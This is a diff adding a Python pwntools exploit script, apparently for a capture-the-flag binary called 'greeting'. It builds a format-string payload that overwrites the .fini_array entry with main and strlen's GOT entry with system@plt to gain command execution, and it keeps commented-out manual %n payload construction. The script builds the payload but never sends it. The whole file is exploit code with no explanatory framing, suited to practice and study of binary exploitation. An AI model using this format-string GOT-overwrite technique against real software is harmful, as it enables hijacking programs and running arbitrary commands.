@@ -1,0 +1,65 @@
+#!/usr/bin/env python3
+
+import sys
+import struct
+import pwn
+import libformatstr as libfsb
+
+
+def b(x):
+    return struct.pack("I", x)
+
+
+io = pwn.process("./greeting")
+
+elf = pwn.ELF("./greeting")
+fini_array = 0x8049934  # to 0x80485ed
+strlen_got = 0x8049A54  # to 08048490
+main = elf.symbols["main"]
+system_plt = elf.plt["system"]
+
+offset = 12
+padding = 2
+writes = {
+    fini_array: main,
+    strlen_got: system_plt,
+}
+payload = pwn.fmtstr_payload(offset, writes, offset_bytes=padding)
+
+# print(len(payload))
+# p = pwn.FmtStr()
+
+# payload = pwn.fmtstr_payload(offset, writes, ,)
+# def send_data(payload):
+# io.sendline(payload)
+# return io.recvall()
+
+
+# fmt_str = pwn.FmtStr(send_fmt_payload)
+# offset = fmt_str.offset
+# print(offset)
+# overwritten canary: 0x1111
+# payload = b"AA"
+# payload += b(strlen_got)
+# payload += b(strlen_got + 2)
+# payload += b(fini_array)
+# payload += b(fini_array + 2)
+# payload += b"%33900x"
+# payload += b"%12$n"
+# payload += b"%33652x"
+# payload += b"%13$n"
+# payload += b"%30x"
+# payload += b"%14$n"
+# payload += b"%30x"
+# payload += b"%15$n"
+
+#
+# if len(payload) > 64:
+#     print("too long")
+#     sys.exit(-1)
+#
+# if len(sys.argv) > 1 and sys.argv[1] == "len":
+#     print(len(payload))
+# else:
+#     sys.stdout.buffer.write(payload)
+# print(len(payload))
